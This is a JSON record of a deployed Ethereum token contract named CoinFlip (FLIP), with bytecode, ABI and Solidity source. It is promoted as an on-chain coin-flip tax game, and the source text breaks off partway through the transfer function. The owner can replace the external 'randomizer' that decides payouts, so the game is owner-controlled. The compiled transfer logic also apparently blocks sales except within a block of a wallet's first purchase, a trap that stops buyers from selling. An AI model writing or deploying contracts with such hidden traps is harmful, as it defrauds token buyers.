{
    "address": "0x134B57Ea092B770b73b3B0566e50d9059cc7393d",
    "tx_hash": "c11aa7d55dae9fb33cf4d7e616922ea831708ba1189c997729be581c4a0190e6",
    "block_number": 18007271,
    "timestamp": 1693154687,
    "gas_used_in_creation": 1842021,
    "creation_bytecode": "60806040526007805460ff191660011790556200001f6009600a62000341565b6200002f906301312d0062000358565b600855620000406009600a62000341565b62000050906301312d0062000358565b6009556009600a62000063919062000341565b6200007290620f424062000358565b600a556002600b819055600c555f600e8190556012805463ffffffff60a01b19169055601455348015620000a4575f80fd5b5060405162001f7c38038062001f7c833981016040819052620000c79162000372565b5f80546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a35060078054610100600160a81b0319166101006001600160a01b03841602179055620001356009600a62000341565b62000145906305f5e10062000358565b335f9081526001602081905260408220929092556003906200016e5f546001600160a01b031690565b6001600160a01b03908116825260208083019390935260409182015f908120805495151560ff1996871617905530815260039093528183208054851660019081179091556007546101009004909116835291208054909216179055620001d13390565b6001600160a01b03165f7fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6200020a6009600a62000341565b6200021a906305f5e10062000358565b60405190815260200160405180910390a3506200039a565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200028657815f19048211156200026a576200026a62000232565b808516156200027857918102915b93841c93908002906200024b565b509250929050565b5f826200029e575060016200033b565b81620002ac57505f6200033b565b8160018114620002c55760028114620002d057620002f0565b60019150506200033b565b60ff841115620002e457620002e462000232565b50506001821b6200033b565b5060208310610133831016604e8410600b841016171562000315575081810a6200033b565b62000321838362000246565b805f190482111562000337576200033762000232565b0290505b92915050565b5f6200035160ff8416836200028e565b9392505050565b80820281158282048414176200033b576200033b62000232565b5f6020828403121562000383575f80fd5b81516001600160a01b038116811462000351575f80fd5b611bd480620003a85f395ff3fe60806040526004361061014a575f3560e01c8063751039fc116100b3578063a9059cbb1161006d578063a9059cbb1461039e578063ca72a4e7146103bd578063d65ab5f2146103dc578063dd62ed3e146103f0578063e6333a0b14610434578063e8cf941c14610449575f80fd5b8063751039fc146103045780637d1db4a51461031857806383bd72ba1461032d5780638da5cb5b146103415780638f9a55c01461035d57806395d89b4114610372575f80fd5b806328f785ee1161010457806328f785ee14610235578063313ce5671461026c57806351bc3c851461028757806353d45f5f1461029d57806370a08231146102bc578063715018a6146102f0575f80fd5b806306fdde0314610155578063095ea7b3146101975780630a702e8d146101c65780630faee56f146101df57806318160ddd1461020257806323b872dd14610216575f80fd5b3661015157005b5f80fd5b348015610160575f80fd5b506040805180820190915260088152670436f696e466c69760c41b60208201525b60405161018e91906117b0565b60405180910390f35b3480156101a2575f80fd5b506101b66101b1366004611812565b61045e565b604051901515815260200161018e565b3480156101d1575f80fd5b506007546101b69060ff1681565b3480156101ea575f80fd5b506101f4600a5481565b60405190815260200161018e565b34801561020d575f80fd5b506101f4610474565b348015610221575f80fd5b506101b661023036600461183c565b610494565b348015610240575f80fd5b50601354610254906001600160a01b031681565b6040516001600160a01b03909116815260200161018e565b348015610277575f80fd5b506040516009815260200161018e565b348015610292575f80fd5b5061029b6104fb565b005b3480156102a8575f80fd5b5061029b6102b736600461187a565b610590565b3480156102c7575f80fd5b506101f46102d636600461187a565b6001600160a01b03165f9081526001602052604090205490565b3480156102fb575f80fd5b5061029b6105ee565b34801561030f575f80fd5b5061029b61065f565b348015610323575f80fd5b506101f460085481565b348015610338575f80fd5b5061029b61071c565b34801561034c575f80fd5b505f546001600160a01b0316610254565b348015610368575f80fd5b506101f460095481565b34801561037d575f80fd5b506040805180820190915260048152630464c49560e41b6020820152610181565b3480156103a9575f80fd5b506101b66103b8366004611812565b610754565b3480156103c8575f80fd5b5061029b6103d736600461187a565b610760565b3480156103e7575f80fd5b5061029b610b3b565b3480156103fb575f80fd5b506101f461040a366004611895565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b34801561043f575f80fd5b506101f4600e5481565b348015610454575f80fd5b506101f460145481565b5f61046a338484610b79565b5060015b92915050565b5f6104816009600a6119c0565b61048f906305f5e1006119ce565b905090565b5f6104a0848484610c9c565b6104f184336104ec85604051806060016040528060288152602001611b77602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190611428565b610b79565b5060019392505050565b60075461010090046001600160a01b0316336001600160a01b03161461051f575f80fd5b61055c61052e6009600a6119c0565b61053c906305f5e1006119ce565b6105479060646119ce565b305f9081526001602052604090205490611460565b305f908152600160205260409020819055801561057c5761057c816114c5565b47801561058c5761058c81611635565b5050565b5f546001600160a01b031633146105c25760405162461bcd60e51b81526004016105b9906119e5565b60405180910390fd5b600f80546001600160a01b039092166001600160a01b0319928316811790915560108054909216179055565b5f546001600160a01b031633146106175760405162461bcd60e51b81526004016105b9906119e5565b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146106885760405162461bcd60e51b81526004016105b9906119e5565b6106946009600a6119c0565b6106a2906305f5e1006119ce565b6008556106b16009600a6119c0565b6106bf906305f5e1006119ce565b60099081556007805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf906106fb90600a6119c0565b610709906305f5e1006119ce565b60405190815260200160405180910390a1565b5f546001600160a01b031633146107455760405162461bcd60e51b81526004016105b9906119e5565b6012805460ff60a81b19169055565b5f61046a338484610c9c565b5f546001600160a01b031633146107895760405162461bcd60e51b81526004016105b9906119e5565b601254600160a01b900460ff16156107e35760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e00000000000000000060448201526064016105b9565b601180546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d90811790915561082c90309061081e6009600a6119c0565b6104ec906305f5e1006119ce565b60115f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801561087c573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108a09190611a1a565b6001600160a01b031663c9c653963060115f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156108ff573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109239190611a1a565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af115801561096d573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109919190611a1a565b601280546001600160a01b039283166001600160a01b03199091161790556011541663f305d71947306109d8816001600160a01b03165f9081526001602052604090205490565b5f806109eb5f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610a51573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190610a769190611a35565b505060125460115460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af1158015610acb573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610aef9190611a60565b5060128054630100010160a01b63ff00ffff60a01b1990911617905543600d55600f80546001600160a01b039092166001600160a01b0319928316811790915560108054909216179055565b5f546001600160a01b03163314610b645760405162461bcd60e51b81526004016105b9906119e5565b6012805460ff60a81b1916600160a81b179055565b6001600160a01b038316610bdb5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016105b9565b6001600160a01b038216610c3c5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016105b9565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610d005760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b60648201526084016105b9565b6001600160a01b038216610d625760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b60648201526084016105b9565b5f8111610dc35760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b60648201526084016105b9565b5f80546001600160a01b03858116911614801590610dee57505f546001600160a01b03848116911614155b8015610e035750601254600160a01b900460ff165b156112e65760075460ff1615610f28576011546001600160a01b03848116911614801590610e3f57506012546001600160a01b03848116911614155b15610f2857325f908152600460205260409020544311610ed95760405162461bcd60e51b815260206004820152604960248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b6064820152681030b63637bbb2b21760b91b608482015260a4016105b9565b325f9081526006602052604090205460ff16610f0157325f9081526005602052604090204390555b325f908152600660209081526040808320805460ff19166001179055600490915290204390555b6012546001600160a01b038581169116148015610f5357506011546001600160a01b03848116911614155b8015610f7757506001600160a01b0383165f9081526003602052604090205460ff16155b1561104857600854821115610fce5760405162461bcd60e51b815260206004820152601960248201527f4578636565647320746865205f6d61785478416d6f756e742e0000000000000060448201526064016105b9565b60095482610ff0856001600160a01b03165f9081526001602052604090205490565b610ffa9190611a7f565b11156110485760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e00000000000060448201526064016105b9565b6012546001600160a01b03848116911614801561106e57506001600160a01b0384163014155b156110bc57611093606461108d600c548561167090919063ffffffff16565b906116ee565b325f9081526005602052604090205490915043906110b2906001611a7f565b10156110bc575f80fd5b6012546001600160a01b0385811691161480156110e157506001600160a01b03831632145b1561125957611100606461108d600b548561167090919063ffffffff16565b601254909150600160a81b900460ff1680156111985750601054600e54604051635297e3d760e11b81523260048201526024810185905260448101919091526207a120916001600160a01b03169063a52fc7ae90606401602060405180830381865afa158015611172573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906111969190611a92565b115b156112595760148054905f6111ac83611aa9565b9091555050601380546001600160a01b03191632908117909155600e545f91825260016020526040909120546111e191611460565b325f9081526001602052604080822092909255600e54308252919020546112079161172f565b305f818152600160205260409081902092909255600e54915132927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9161125091815260200190565b60405180910390a35b601254600160b01b900460ff1615801561128057506012546001600160a01b038481169116145b80156112955750601254600160b81b900460ff165b156112e6576112d46112cf836112ca6112c2306001600160a01b03165f9081526001602052604090205490565b600a54611770565b611770565b6114c5565b4780156112e4576112e447611635565b505b801561136357600e819055305f9081526001602052604090205461130a9082611460565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061135a9085815260200190565b60405180910390a35b6001600160a01b0384165f90815260016020526040902054611385908361172f565b6001600160a01b0385165f908152600160205260409020556113c86113aa838361172f565b6001600160a01b0385165f9081526001602052604090205490611460565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef611411858561172f565b60405190815260200160405180910390a350505050565b5f818484111561144b5760405162461bcd60e51b81526004016105b991906117b0565b505f6114578486611ac1565b95945050505050565b5f8061146c8385611a7f565b9050838110156114be5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016105b9565b9392505050565b6012805460ff60b01b1916600160b01b1790556040805160028082526060820183525f9260208301908036833701905050905030815f8151811061150b5761150b611ad4565b6001600160a01b03928316602091820292909201810191909152601154604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611562573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906115869190611a1a565b8160018151811061159957611599611ad4565b6001600160a01b0392831660209182029290920101526011546115bf9130911684610b79565b60115460405163791ac94760e01b81526001600160a01b039091169063791ac947906115f79085905f90869030904290600401611ae8565b5f604051808303815f87803b15801561160e575f80fd5b505af1158015611620573d5f803e3d5ffd5b50506012805460ff60b01b1916905550505050565b6007546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f1935050505015801561058c573d5f803e3d5ffd5b5f825f0361167f57505f61046e565b5f61168a83856119ce565b9050826116978583611b57565b146114be5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016105b9565b5f6114be83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250611784565b5f6114be83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611428565b5f81831161177e57826114be565b50919050565b5f81836117a45760405162461bcd60e51b81526004016105b991906117b0565b505f6114578486611b57565b5f6020808352835180828501525f5b818110156117db578581018301518582016040015282016117bf565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461180f575f80fd5b50565b5f8060408385031215611823575f80fd5b823561182e816117fb565b946020939093013593505050565b5f805f6060848603121561184e575f80fd5b8335611859816117fb565b92506020840135611869816117fb565b929592945050506040919091013590565b5f6020828403121561188a575f80fd5b81356114be816117fb565b5f80604083850312156118a6575f80fd5b82356118b1816117fb565b915060208301356118c1816117fb565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561191a57815f1904821115611900576119006118cc565b8085161561190d57918102915b93841c93908002906118e5565b509250929050565b5f826119305750600161046e565b8161193c57505f61046e565b8160018114611952576002811461195c57611978565b600191505061046e565b60ff84111561196d5761196d6118cc565b50506001821b61046e565b5060208310610133831016604e8410600b841016171561199b575081810a61046e565b6119a583836118e0565b805f19048211156119b8576119b86118cc565b029392505050565b5f6114be60ff841683611922565b808202811582820484141761046e5761046e6118cc565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f60208284031215611a2a575f80fd5b81516114be816117fb565b5f805f60608486031215611a47575f80fd5b8351925060208401519150604084015190509250925092565b5f60208284031215611a70575f80fd5b815180151581146114be575f80fd5b8082018082111561046e5761046e6118cc565b5f60208284031215611aa2575f80fd5b5051919050565b5f60018201611aba57611aba6118cc565b5060010190565b8181038181111561046e5761046e6118cc565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b81811015611b365784516001600160a01b031683529383019391830191600101611b11565b50506001600160a01b03969096166060850152505050608001529392505050565b5f82611b7157634e487b7160e01b5f52601260045260245ffd5b50049056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220962870e1041ad2636513d804773ad78fe08731bce979a0c6675c010a0a4a62fc64736f6c63430008150033000000000000000000000000d06524f7bd92e91ff1edbb159d9b1edf970c9c99",
    "runtime_bytecode": "",
    "contract_name": "CoinFlip",
    "compiler_version": "v0.8.21+commit.d9974bed",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"taxWallet\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_previousCollectedTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newRandomizerAddress\",\"type\":\"address\"}],\"name\":\"changeRandomizer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"latestMSGsender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_randomizerAddress\",\"type\":\"address\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startGame\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stopGame\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"timesWon\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelay\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "// SPDX-License-Identifier: MIT\r\n/**\r\n\r\nCoin flip is an on-chain game. To see how it works look at the website!\r\n\r\nwebsite: https://www.coin-flip-token.com/\r\n\r\ntwiter: https://twitter.com/CoinFlipTaxGame\r\n\r\ntelegram: https://t.me/coinFlipTaxGame\r\n\r\n\r\n**/\r\npragma solidity 0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n}\r\n\r\ninterface randomizerContract {\r\n    function randomNum(\r\n        address wallet,\r\n        uint256 amount,\r\n        uint256 previousCollectedTax\r\n    ) external view returns (uint256);\r\n}\r\n\r\ncontract CoinFlip is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = unicode\"CoinFlip\";\r\n    string private constant _symbol = unicode\"FLIP\";\r\n\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _isExcludedFromFee;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    mapping(address => uint256) private _holderLastBuy;\r\n    mapping(address => bool) private _isHolder;\r\n    bool public transferDelay = true;\r\n    address payable private _taxWallet;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 100000000 * 10**_decimals;\r\n    uint256 public _maxTxAmount = 20000000 * 10**_decimals;\r\n    uint256 public _maxWalletSize = 20000000 * 10**_decimals;\r\n    uint256 public _maxTaxSwap = 1000000 * 10**_decimals;\r\n\r\n    uint256 private BuyTax = 2;\r\n    uint256 private SellTax = 2;\r\n    uint256 private launchedAt;\r\n\r\n    uint256 public _previousCollectedTax = 0;\r\n\r\n    address private randomizerAddress;\r\n    randomizerContract private randomizer;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen = false;\r\n    bool private gameOpen = false;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    address public latestMSGsender;\r\n    uint256 public timesWon = 0;\r\n\r\n    event MaxTxAmountUpdated(uint256 _maxTxAmount);\r\n    modifier lockTheSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor(address taxWallet) {\r\n        _taxWallet = payable(taxWallet);\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxWallet] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"ERC20: transfer amount exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxNum = 0;\r\n        if (from != owner() && to != owner() && tradingOpen) {\r\n\r\n\r\n            if (transferDelay) {\r\n                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {\r\n                    require(_holderLastTransferTimestamp[tx.origin] < block.number,\"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\r\n                    if(!_isHolder[tx.origin]){\r\n                          _holderLastBuy[tx.origin] = block.number;\r\n                      }\r\n                      _isHolder[tx.origin] = true;\r\n                    _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                